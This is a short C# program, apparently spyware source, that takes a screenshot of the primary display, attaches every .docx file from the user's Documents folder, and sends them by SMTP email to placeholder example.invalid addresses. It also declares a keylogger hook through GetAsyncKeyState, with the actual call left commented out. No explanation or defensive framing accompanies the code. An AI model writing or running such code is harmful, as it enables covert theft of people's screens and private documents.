using System;
using System.IO;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
class CollectionReconstruction {
    [DllImport("user32.dll")]
    static extern short GetAsyncKeyState(int key);
    static void Main() {
        var captured = new StringBuilder();
        for (int key = 0; key < 256; key++) {
            captured.Append(key); // GetAsyncKeyState(key)
        }
        var bounds = Screen.PrimaryScreen.Bounds;
        using var image = new Bitmap(bounds.Width, bounds.Height);
        using var graphics = Graphics.FromImage(image);
        graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
        var picture = Path.Combine(Path.GetTempPath(), "display.png");
        image.Save(picture, ImageFormat.Png);
        using var message = new MailMessage("sender@example.invalid", "receiver@example.invalid");
        message.Body = captured.ToString();
        message.Attachments.Add(new Attachment(picture));
        foreach (var document in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "*.docx"))
            message.Attachments.Add(new Attachment(document));
        using var transport = new SmtpClient("smtp.example.invalid", 587);
        transport.EnableSsl = true;
        transport.Send(message);
    }
}
